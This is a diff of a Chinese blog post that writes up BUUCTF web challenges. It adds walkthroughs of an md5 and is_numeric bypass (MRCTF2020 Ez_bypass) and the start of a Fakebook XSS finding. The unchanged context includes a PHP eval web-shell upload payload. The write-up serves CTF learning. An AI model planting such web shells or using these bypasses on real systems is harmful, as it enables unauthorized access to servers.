@@ -33,7 +33,7 @@
                             "url": "https:\/\/1iu2y.github.io\/posts\/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4\/featured-image.png",
                             "width":  1975 ,
                             "height":  910 
-                        }],"genre": "posts","keywords": "CTF, web","wordcount":  311 ,
+                        }],"genre": "posts","keywords": "CTF, web","wordcount":  884 ,
         "url": "https:\/\/1iu2y.github.io\/posts\/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4\/","datePublished": "2021-08-24T19:10:31+08:00","dateModified": "2021-08-24T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -110,8 +110,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">BUUCTF Web记录 4</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-24">2021-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 311 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 1 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-24">2021-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 884 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -127,6 +127,12 @@
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li><a href="#0x00-mrctf2020你传你呢">0x00 [MRCTF2020]你传你🐎呢</a></li>
+    <li><a href="#0x01-mrctf2020ez_bypass">0x01 [MRCTF2020]Ez_bypass</a>
+      <ul>
+        <li><a href="#参考链接">参考链接</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-网鼎杯-2018fakebook">0x02 [网鼎杯 2018]Fakebook</a></li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><p>已经到第4篇了，不容易啊</p>
@@ -172,7 +178,138 @@ SetHandler application/x-httpd-php
 <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s1">&#39;php&#39;</span><span class="o">&gt;@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ye&#39;</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>蚁剑连接即可。</p></div><div class="post-footer" id="post-footer">
+</div><p>蚁剑连接即可。</p>
+<h2 id="0x01-mrctf2020ez_bypass">0x01 [MRCTF2020]Ez_bypass</h2>
+<p><a href="https://buuoj.cn/challenges#[MRCTF2020]Ez_bypass" target="_blank" rel="noopener noreffer">题目链接</a></p>
+<p>这题就这？</p>
+<p>根据提示看php源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">I put something in F12 for you
+include &#39;flag.php&#39;;
+$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;
+if(isset($_GET[&#39;gg&#39;])<span class="err">&amp;&amp;</span>isset($_GET[&#39;id&#39;])) {
+    $id=$_GET[&#39;id&#39;];
+    $gg=$_GET[&#39;gg&#39;];
+    if (md5($id) === md5($gg) <span class="err">&amp;&amp;</span> $id !== $gg) {
+        echo &#39;You got the first step&#39;;
+        if(isset($_POST[&#39;passwd&#39;])) {
+            $passwd=$_POST[&#39;passwd&#39;];
+            if (!is_numeric($passwd))
+            {
+                 if($passwd==1234567)
+                 {
+                     echo &#39;Good Job!&#39;;
+                     highlight_file(&#39;flag.php&#39;);
+                     die(&#39;By Retr_0&#39;);
+                 }
+                 else
+                 {
+                     echo &#34;can you think twice??&#34;;
+                 }
+            }
+            else{
+                echo &#39;You can not get it !&#39;;
+            }
+
+        }
+        else{
+            die(&#39;only one way to get the flag&#39;);
+        }
+}
+    else {
+        echo &#34;You are not a real hacker!&#34;;
+    }
+}
+else{
+    die(&#39;Please input first&#39;);
+}
+}Please input first
+</code></pre></td></tr></table>
+</div>
+</div><p>存在两层需要绕过</p>
+<p>第一层，满足两个get请求参数的md5强相等但是参数不相等，这显然是传数组呀。需要记住的是，对于php后端，get请求传递数组的方式为<code>/?a[]=1</code>，这样相当于传递了<code>a = [1]</code>，<code>/?a[]=1&amp;a[]=2</code>则相当于传递了<code>a = [1, 2]</code>。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105000448.png" title="image-20210825105000448" data-thumbnail="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105000448.png" data-sub-html="<h2>md5绕过</h2><p>image-20210825105000448</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210825105000448.png"
+            data-srcset="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105000448.png, image-20210825105000448.png 1.5x, /posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105000448.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105000448.png" />
+    </a><figcaption class="image-caption">md5绕过</figcaption>
+    </figure></p>
+<p>第二层要求post的参数经<code>is_numeric()</code>返回<code>false</code>，但是要能够满足<code>==1234567</code>。百度一下<code>is_numeric()</code>绕过即可，最简单的方式就是post一个字符串<code>1234567 </code>，注意后面加了个空格。<code>1234567%00</code>同样可以满足要求。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105341819.png" title="image-20210825105341819" data-thumbnail="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105341819.png" data-sub-html="<h2>is_numeric绕过</h2><p>image-20210825105341819</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210825105341819.png"
+            data-srcset="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105341819.png, image-20210825105341819.png 1.5x, /posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105341819.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825105341819.png" />
+    </a><figcaption class="image-caption">is_numeric绕过</figcaption>
+    </figure></p>
+<h3 id="参考链接">参考链接</h3>
+<ul>
+<li><a href="https://blog.csdn.net/qq_33583069/article/details/115562765" target="_blank" rel="noopener noreffer">[CTF]php is_numeric绕过</a></li>
+</ul>
+<h2 id="0x02-网鼎杯-2018fakebook">0x02 [网鼎杯 2018]Fakebook</h2>
+<p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Fakebook" target="_blank" rel="noopener noreffer">题目链接</a></p>
+<p>fakebook，自己提交信息然后点join，就可以在网站上看到，<del>这题应该是xss</del>。</p>
+<p>试了一下，用户名可以xss。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825111401320.png" title="image-20210825111401320" data-thumbnail="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825111401320.png" data-sub-html="<h2>join</h2><p>image-20210825111401320</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210825111401320.png"
+            data-srcset="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825111401320.png, image-20210825111401320.png 1.5x, /posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825111401320.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825111401320.png" />
+    </a><figcaption class="image-caption">join</figcaption>
+    </figure></p></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
